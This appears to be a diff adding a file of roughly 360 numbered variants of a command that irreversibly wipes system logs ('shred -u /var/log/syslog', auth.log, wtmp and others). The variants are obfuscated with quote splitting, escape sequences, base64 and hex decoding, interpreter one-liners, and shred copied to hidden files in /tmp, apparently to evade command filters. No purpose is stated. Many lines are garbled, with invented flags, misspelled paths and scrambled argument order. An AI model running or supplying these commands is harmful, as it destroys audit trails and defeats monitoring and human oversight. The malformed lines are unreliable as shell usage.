@@ -1,0 +1,360 @@
+1. shred -u /var/"log"/syslog
+2. shred -u /"var"/log/syslog
+3. shred -u "/var"/log/syslog
+4. shred -u /var/log/"syslog"
+5. shred -u /var/log/sys"log"
+6. shred -u /va"r"/log/syslog
+7. shred -u /var/lo"g"/syslog
+8. sh"red" -u /var/log/syslog
+9. "shred" -u /var/log/syslog
+10. /usr/bin/"shred" -u /var/log/syslog
+11. /usr/bin/sh"red" -u /var/log/syslog
+12. sh$'red' -u /var/log/syslog
+13. shre"d" -u /var/log/syslog
+14. shre\u0064 -u /var/log/syslog
+15. sh\u0072ed -u /var/log/syslog
+16. shred -u /va\u0072/log/syslog
+17. shred -u /var/log/sys\u006cog
+18. shred -u /var/log/sy\u0073log
+19. shred -u /var/log/sy"sl"og
+20. shred -u /var/l"og"/syslog
+21. shred -u /v"ar"/log/syslog
+22. /bin/shred -u /var/"log"/syslog
+23. /bin/"shred" -u /var/log/syslog
+24. sh"re""d" -u /var/log/syslog
+25. s"hr"ed -u /var/log/syslog
+26. shre"d" -u "/var/log/syslog"
+27. shred -u /var/log/syslog#
+28. shred -u /var/log/syslog\
+29. shred -u "/var"/"log"/"syslog"
+30. sh$'\x72'$'ed' -u /var/log/syslog
+1. sh""red -u /var/log/syslog
+2. sh"+"red -u /var/log/syslog
+3. shred -u /var/lo""g/syslog
+4. shred -u /va""r/log/syslog
+5. shred -u /var/log/sy""slog
+6. shred -u /var/log/sys"+"log
+7. shred -u "/var"/"log"/"syslog"
+8. /usr/"bin"/shred -u /var/log/syslog
+9. /usr/bin/shred -u "/var/log"/syslog
+10. /usr/bin/shred -u /var/log/"sys""log"
+11. shred -u /va$'r'/log/syslog
+12. shred -u /var/log/s$'yslog'
+13. shred -u /var/log/$'syslog'
+14. sh$'red' -u "$"/var/log/syslog
+15. sh$'r''ed' -u /var/log/syslog
+16. /usr/bin/s"hr""ed" -u /var/log/syslog
+17. /usr/bin/shre"d" -u /va"r"/log/syslog
+18. shred -u /var/l\u006fg/syslog
+19. shred -u /va\u0072/log/sy\u0073log
+20. shred -u "/va\u0072/log/sy\u0073log"
+21. shre\u0064 -u "/var/log/syslog"
+22. "sh""red" -u /var/log/syslog
+23. s"hr""ed" -u /var/log/syslog
+24. shre""d" -u /va""r"/log/syslog
+25. sh""r""ed" -u /var/log/syslog
+26. shred -u /"var"/"log"/sys"log"
+27. sh"+"red -u /"var/log"/"syslog"
+28. sh"+"re"+"d" -u /var/log/syslog
+29. shred -u "/var"/log/"syslog"
+30. s$'h'$'red' -u /var/log/syslog
+1. `shred --remove /var/log/syslog`
+2. `shred --remove=yes /var/log/syslog`
+3. `shred -u --verbose /var/log/syslog`
+4. `shred --remove --verbose /var/log/syslog`
+5. `shred --force --remove /var/log/syslog`
+6. `shred -u /var/log/messages`
+7. `shred -u /var/log/kern.log`
+8. `shred -u /var/log/auth.log`
+9. `shred --remove /var/log/auth.log`
+10. `shred -f --remove /var/log/syslog`
+11. `shred --force --remove=yes /var/log/syslog`
+12. `shred -u --force /var/log/syslog`
+13. `shred -u -v /var/log/syslog`
+14. `shred --remove --zero /var/log/syslog`
+15. `shred --iterations=3 --remove /var/log/syslog`
+16. `shred -n 5 --remove /var/log/syslog`
+17. `shred --remove --random-source=/dev/urandom /var/log/syslog`
+18. `shred --remove=yes --zero /var/log/syslog`
+19. `shred -f -u /var/log/syslog`
+20. `shred --remove --force /var/log/syslog`
+21. `shred --remove /var/log/wtmp`
+22. `shred --remove /var/log/btmp`
+23. `shred --remove /var/log/lastlog`
+24. `shred --remove /var/log/faillog`
+25. `shred --remove /var/log/dmesg`
+26. `shred --remove /var/log/debug`
+27. `shred -u --remove /var/log/syslog`
+28. `shred -u --remove=yes /var/log/syslog`
+29. `shred --remove /var/log/syslog.1`
+30. `shred -f --remove /var/log/syslog.1`
+1. `shred --remove=wipe /var/log/syslog`
+2. `shred --remove=shred /var/log/syslog`
+3. `shred --remove=unlink /var/log/syslog`
+4. `shred --rm /var/log/syslog`
+5. `shred --delete /var/log/syslog`
+6. `shred --erase /var/log/syslog`
+7. `shred --obliterate /var/log/syslog`
+8. `shred --destroy /var/log/syslog`
+9. `shred --wipe /var/log/syslog`
+10. `shred --purge /var/log/syslog`
+11. `shred --nuke /var/log/syslog`
+12. `shred --trash /var/log/syslog`
+13. `shred -u /var/log/boot.log`
+14. `shred --remove /var/log/boot.log`
+15. `shred --remove --quiet /var/log/syslog`
+16. `shred -u --iterations=1 /var/log/syslog`
+17. `shred --remove --iterations=2 /var/log/syslog`
+18. `shred --rm -v /var/log/syslog`
+19. `shred --rm --iterations=3 /var/log/syslog`
+20. `shred -f --rm /var/log/syslog`
+21. `shred --delete --force /var/log/syslog`
+22. `shred --remove /var/log/apt/history.log`
+23. `shred --remove /var/log/installer/syslog`
+24. `shred --remove /var/log/installer/debug`
+25. `shred --remove /var/log/cloud-init.log`
+26. `shred --remove /var/log/cloud-init-output.log`
+27. `shred --remove /var/log/unattended-upgrades/unattended-upgrades.log`
+28. `shred -u /var/log/alternatives.log`
+29. `shred -u /var/log/user.log`
+30. `shred --remove /var/log/user.log`
+1. shred -u /var/log/syslo
+2. shred -u /var/log/sylog
+3. shred -u /var/log/ysylog
+4. shred -u /var/log/syslogg
+5. shred -u /var/log/slog
+6. shred -u /var/log/sylogg
+7. shred -u /var/log/sysloog
+8. shred -u /var/log/syslg
+9. shred -u /var/log/ssylog
+10. shred -u /var/log/sylogl
+11. shred -u /var/log/sysog
+12. shred -u /var/log/syslo
+13. shred -u /var/og/syslog
+14. shred -u /va/log/syslog
+15. shred -u /var/log/sylog/
+16. shred -u /var/log/syslog.
+17. shred -u /var/log/syslo/
+18. shred -u /var/l/log/syslog
+19. shred -u /va/r/log/syslog
+20. shred -u /var//log/syslog
+21. shred -u /var/log//syslog
+22. shred -u /var/log/syslo.log
+23. shred -u /var/log/sylogg/
+24. shred -u /var/log/syslog1
+25. shred -u /var/log/syslogg.
+26. shred -u /var/log/syslo1
+27. shred -u /var//log//syslog
+28. shred -u /var/log/sysl
+29. shred -u /var/lg/syslog
+30. shred -u /var/lgo/syslog
+1. shred -u /var/log/yslog
+2. shred -u /var/lo/syslog
+3. shred -u /va/log/syslog
+4. shred -u /var/log/sysog
+5. shred -u /var/log/yslogg
+6. shred -u /var/lgo/syslog
+7. shred -u /var/log/sylog.
+8. shred -u /var/l/syslog
+9. shred -u /v/ar/log/syslog
+10. shred -u /var/log/sylog/
+11. shred -u /var/log/sylogg.
+12. shred -u /var/log/sylog1
+13. shred -u /va//log/syslog
+14. shred -u /var/log/sysl0g
+15. shred -u /var//log/sylog
+16. shred -u /var/log/sylog2
+17. shred -u /var/log/sys1og
+18. shred -u /va/log/sylog
+19. shred -u /var/log/syslo_
+20. shred -u /var/lg/syslg
+21. shred -u /var/log/sys1g
+22. shred -u /va/log/syslo
+23. shred -u /var//log/syslg
+24. shred -u /var/log/slogg
+25. shred -u /var/log/sys1log
+26. shred -u /var/lgo/sylog
+27. shred -u /var/lg/sylog
+28. shred -u /var/log/sy1log
+29. shred -u /var/lo/syslo
+30. shred -u /v/log/syslog
+1. shred /var/log/syslog -u
+2. u shred /var/log/syslog
+3. /var/log/syslog shred -u
+4. /var/log/syslog -u shred
+5. u /var/log/syslog shred
+6. shred /var/log/syslog --remove
+7. shred --remove /var/log/syslog
+8. /var/log/syslog --remove shred
+9. -remove /var/log/syslog shred
+10. -remove shred /var/log/syslog
+11. shred --remove=unlink /var/log/syslog
+12. /var/log/syslog shred --remove=unlink
+13. shred /var/log/syslog --force --remove
+14. -force shred --remove /var/log/syslog
+15. /var/log/syslog --force shred --remove
+16. shred -u --force /var/log/syslog
+17. /var/log/syslog -u --force shred
+18. u --force shred /var/log/syslog
+19. shred /var/log/syslog -u --verbose
+20. shred --verbose /var/log/syslog -u
+21. /var/log/syslog shred -u --verbose
+22. shred -u /var/log/syslog --force
+23. /var/log/syslog --force -u shred
+24. -force /var/log/syslog -u shred
+25. -remove --force /var/log/syslog shred
+26. shred --force --remove /var/log/syslog
+27. u /var/log/syslog --force shred
+28. shred -u --remove=wipe /var/log/syslog
+29. /var/log/syslog shred --remove=wipe -u
+30. -remove=wipe -u shred /var/log/syslog
+1. /var/log/syslog -u shred --force
+2. -verbose -u shred /var/log/syslog
+3. u /var/log/syslog shred --verbose
+4. shred --remove --force -u /var/log/syslog
+5. -remove -u shred /var/log/syslog
+6. /var/log/syslog shred --force -u
+7. u --remove=unlink /var/log/syslog shred
+8. shred -u --remove=unlink --verbose /var/log/syslog
+9. -force --remove shred -u /var/log/syslog
+10. /var/log/syslog --remove=wipe --force shred
+11. shred --remove --verbose /var/log/syslog -u
+12. -force shred -u /var/log/syslog --remove
+13. -verbose shred /var/log/syslog -u --remove
+14. /var/log/syslog shred --verbose -u
+15. shred --remove=wipe -u /var/log/syslog
+16. u --remove=wipe shred /var/log/syslog
+17. shred /var/log/syslog --verbose --remove
+18. /var/log/syslog --remove shred --force
+19. shred /var/log/syslog --force -u
+20. /var/log/syslog -u --remove shred
+21. shred --remove /var/log/syslog -u
+22. -remove=unlink shred -u /var/log/syslog
+23. -force /var/log/syslog shred -u
+24. /var/log/syslog --verbose -u shred
+25. shred --remove=wipe --force /var/log/syslog -u
+26. -remove --verbose /var/log/syslog shred
+27. u --force /var/log/syslog shred
+28. -remove -u /var/log/syslog shred
+29. -remove=unlink --verbose shred /var/log/syslog -u
+30. /var/log/syslog -u shred --remove=unlink
+1. `shred -u /var/log/017163`
+2. `shred -u /var/log/0x7f000001`
+3. `shred -u /var/log/2130706433`
+4. `shred -u /var/log/0x7F000001`
+5. `shred -u /var/log/3232235521`
+6. `shred -u /var/log/0xC0A80001`
+7. `shred -u /var/log/030052000001`
+8. `shred -u /var/log/0b01111111000000000000000000000001`
+9. `shred -u /var/log/0x00007F000001`
+10. `shred -u /var/log/\x2f\x76\x61\x72\x2f\x6c\x6f\x67\x2f\x73\x79\x73\x6c\x6f\x67`
+11. `shred -u /var/log/$((2130706433))`
+12. `shred -u /var/log/$'\x2fvar\x2flog\x2fsyslog'`
+13. `shred -u /var/log/`echo -e "\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147"`
+14. `shred -u /var/log/$(printf '%s' '/var/log/syslog')`
+15. `shred -u $(echo '/var/log/syslog')`
+16. `shred -u $(echo -n '/var/log/syslog')`
+17. `shred -u "$(cat <<< '/var/log/syslog')"`
+18. `shred -u $(echo '/var'/'log'/'syslog')`
+19. `shred -u $(tr -d '\n' <<< '/var/log/syslog')`
+20. `shred -u $(eval echo /var/log/syslog)`
+21. `shred -u "$(printf '/%s/%s/%s' var log syslog)"`
+22. `shred -u $(echo /var/log/$(basename /var/log/syslog))`
+23. `shred -u $(cut -d ":" -f2 <<< "target:/var/log/syslog")`
+24. `shred -u $(sed 's/^.*://' <<< "logpath:/var/log/syslog")`
+25. `shred -u $(awk -F: '{print $2}' <<< "log:/var/log/syslog")`
+26. `shred -u $(readlink -f /var/../var/log/syslog)`
+27. `shred -u $(python3 -c "print('/var/log/' + 'syslog')")`
+28. `shred -u $(perl -e "print '/var/log/syslog'")`
+29. `shred -u $(node -e "console.log('/var/log/syslog')")`
+30. `shred -u $(echo c3hyZWQgLXUgL3Zhci9sb2cvc3lzbG9n | base64 -d | cut -d ' ' -f3)`
+1. `shred -u $'\x2fvar\x2flog\x2fsyslog'`
+2. `shred -u $(printf '\x2fvar\x2flog\x2fsyslog')`
+3. `shred -u $(echo -e '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147')`
+4. `shred -u $(printf '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147')`
+5. `shred -u $(echo $'\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147')`
+6. `shred -u $(awk 'BEGIN{printf "/var/log/syslog"}')`
+7. `shred -u $(perl -e 'print "/var/log/syslog"')`
+8. `shred -u $(python3 - <<<'print("/var/log/syslog")')`
+9. `shred -u $(ruby -e 'print "/var/log/syslog"')`
+10. `shred -u $(php -r 'echo "/var/log/syslog";')`
+11. `shred -u $(node -e 'process.stdout.write("/var/log/syslog")')`
+12. `shred -u $(printf '/%s/%s/%s' var log syslog)`
+13. `shred -u $(echo /var/log/{syslog})`
+14. `shred -u $(echo /va*r/lo*g/syslo*g)`
+15. `shred -u $(sed 's/_/\//g' <<< '_var_log_syslog')`
+16. `shred -u $(tr '_' '/' <<< '_var_log_syslog')`
+17. `shred -u $(cut -d, -f2 <<< 'x,/var/log/syslog')`
+18. `shred -u $(rev <<< 'golsys/gol/rav/' | rev)`
+19. `shred -u $(echo 2f7661722f6c6f672f7379736c6f67 | xxd -r -p)`
+20. `shred -u $(echo L3Zhci9sb2cvc3lzbG9n | base64 -d)`
+21. `shred -u $(printf '%b' '\x2f\x76\x61\x72\x2f\x6c\x6f\x67\x2f\x73\x79\x73\x6c\x6f\x67')`
+22. `shred -u $(echo $((0x2f766172)) | sed 's/.*/\/var\/log\/syslog/')`
+23. `shred -u $(printf '/var/%s/%s' log syslog)`
+24. `shred -u $(echo /var/log/syslog | iconv -f utf-8 -t utf-8)`
+25. `shred -u $(printf '%s' "$(echo /var/log/syslog)")`
+26. `shred -u $(sed -n '1p' <<< '/var/log/syslog')`
+27. `shred -u $(head -n1 <<< '/var/log/syslog')`
+28. `shred -u $(tail -n1 <<< '/var/log/syslog')`
+29. `shred -u $(echo /var/log/syslog | awk '{print}')`
+30. `shred -u $(printf '/%c%c%c/%c%c%c/%c%c%c%c%c%c%c' 118 97 114 108 111 103 115 121 115 108 111 103)`
+1. `cp /usr/bin/shred /tmp/x; /tmp/x -u /var/log/syslog`
+2. `cp $(which shred) /tmp/del; /tmp/del -u /var/log/syslog`
+3. `install /usr/bin/shred /tmp/a; /tmp/a -u /var/log/syslog`
+4. `cp /bin/shred /dev/shm/s; /dev/shm/s -u /var/log/syslog`
+5. `ln /usr/bin/shred /tmp/logclear; /tmp/logclear -u /var/log/syslog`
+6. `cp /usr/bin/shred ./s1; ./s1 -u /var/log/syslog`
+7. `cp $(command -v shred) /tmp/rmsh; /tmp/rmsh -u /var/log/syslog`
+8. `cp /usr/bin/shred /tmp/.log; /tmp/.log -u /var/log/syslog`
+9. `cp /usr/bin/shred /tmp/syslogdel; /tmp/syslogdel -u /var/log/syslog`
+10. `cp /usr/bin/shred /tmp/.xlog; /tmp/.xlog -u /var/log/syslog`
+11. `cp /usr/bin/shred /dev/shm/x; /dev/shm/x -u /var/log/syslog`
+12. `cp /usr/bin/shred /var/tmp/rmlog; /var/tmp/rmlog -u /var/log/syslog`
+13. `install -m 755 /usr/bin/shred /tmp/y; /tmp/y -u /var/log/syslog`
+14. `cp /usr/bin/shred /tmp/lc; nohup /tmp/lc -u /var/log/syslog &`
+15. `cp /usr/bin/shred /tmp/a.out; /tmp/a.out -u /var/log/syslog`
+16. `cp /usr/bin/shred ~/sdel; ~/sdel -u /var/log/syslog`
+17. `cp /usr/bin/shred /tmp/.temp; /tmp/.temp -u /var/log/syslog`
+18. `cp /usr/bin/shred /run/shm/sh; /run/shm/sh -u /var/log/syslog`
+19. `cp /usr/bin/shred /tmp/cleaner; /tmp/cleaner -u /var/log/syslog`
+20. `cp /usr/bin/shred /tmp/xx; /tmp/xx -u /var/log/syslog`
+21. `cp /usr/bin/shred /tmp/shred99; /tmp/shred99 -u /var/log/syslog`
+22. `cp /usr/bin/shred /tmp/.h; /tmp/.h -u /var/log/syslog`
+23. `cp /usr/bin/shred /tmp/syswipe; /tmp/syswipe -u /var/log/syslog`
+24. `cp /usr/bin/shred /tmp/clr; /tmp/clr -u /var/log/syslog`
+25. `cp /usr/bin/shred /tmp/zlog; /tmp/zlog -u /var/log/syslog`
+26. `cp /usr/bin/shred /tmp/tmpx; /tmp/tmpx -u /var/log/syslog`
+27. `cp /usr/bin/shred /var/tmp/.x; /var/tmp/.x -u /var/log/syslog`
+28. `cp /usr/bin/shred /tmp/final; /tmp/final -u /var/log/syslog`
+29. `cp /usr/bin/shred /tmp/.null; /tmp/.null -u /var/log/syslog`
+30. `cp /usr/bin/shred /tmp/logwipe; /tmp/logwipe -u /var/log/syslog`
+1. `cp /usr/bin/shred /tmp/.cache; /tmp/.cache -u /var/log/syslog`
+2. `cp /usr/bin/shred /tmp/rmd; /tmp/rmd -u /var/log/syslog`
+3. `cp /usr/bin/shred /tmp/logclean; /tmp/logclean -u /var/log/syslog`
+4. `cp /usr/bin/shred /tmp/sh0; /tmp/sh0 -u /var/log/syslog`
+5. `cp /usr/bin/shred /tmp/sysdel; /tmp/sysdel -u /var/log/syslog`
+6. `cp /usr/bin/shred /tmp/binlog; /tmp/binlog -u /var/log/syslog`
+7. `cp /usr/bin/shred /tmp/xbin; /tmp/xbin -u /var/log/syslog`
+8. `cp /usr/bin/shred /tmp/zrm; /tmp/zrm -u /var/log/syslog`
+9. `cp /usr/bin/shred /tmp/destroy; /tmp/destroy -u /var/log/syslog`
+10. `cp /usr/bin/shred /tmp/trash; /tmp/trash -u /var/log/syslog`
+11. `cp /usr/bin/shred /tmp/lzap; /tmp/lzap -u /var/log/syslog`
+12. `cp /usr/bin/shred /tmp/.sys; /tmp/.sys -u /var/log/syslog`
+13. `cp /usr/bin/shred /tmp/tmpclear; /tmp/tmpclear -u /var/log/syslog`
+14. `cp /usr/bin/shred /tmp/.wipe; /tmp/.wipe -u /var/log/syslog`
+15. `cp /usr/bin/shred /tmp/.rmx; /tmp/.rmx -u /var/log/syslog`
+16. `cp /usr/bin/shred /tmp/r; /tmp/r -u /var/log/syslog`
+17. `cp /usr/bin/shred /tmp/_s; /tmp/_s -u /var/log/syslog`
+18. `cp /usr/bin/shred /tmp/klog; /tmp/klog -u /var/log/syslog`
+19. `cp /usr/bin/shred /tmp/.hidden; /tmp/.hidden -u /var/log/syslog`
+20. `cp /usr/bin/shred /tmp/bkdel; /tmp/bkdel -u /var/log/syslog`
+21. `cp /usr/bin/shred /tmp/killog; /tmp/killog -u /var/log/syslog`
+22. `cp /usr/bin/shred /tmp/zclear; /tmp/zclear -u /var/log/syslog`
+23. `cp /usr/bin/shred /tmp/hide; /tmp/hide -u /var/log/syslog`
+24. `cp /usr/bin/shred /tmp/cleanse; /tmp/cleanse -u /var/log/syslog`
+25. `cp /usr/bin/shred /tmp/.clog; /tmp/.clog -u /var/log/syslog`
+26. `cp /usr/bin/shred /tmp/shr; /tmp/shr -u /var/log/syslog`
+27. `cp /usr/bin/shred /tmp/.zzz; /tmp/.zzz -u /var/log/syslog`
+28. `cp /usr/bin/shred /tmp/silent; /tmp/silent -u /var/log/syslog`
+29. `cp /usr/bin/shred /tmp/tlog; /tmp/tlog -u /var/log/syslog`
+30. `cp /usr/bin/shred /tmp/oblit; /tmp/oblit -u /var/log/syslog`
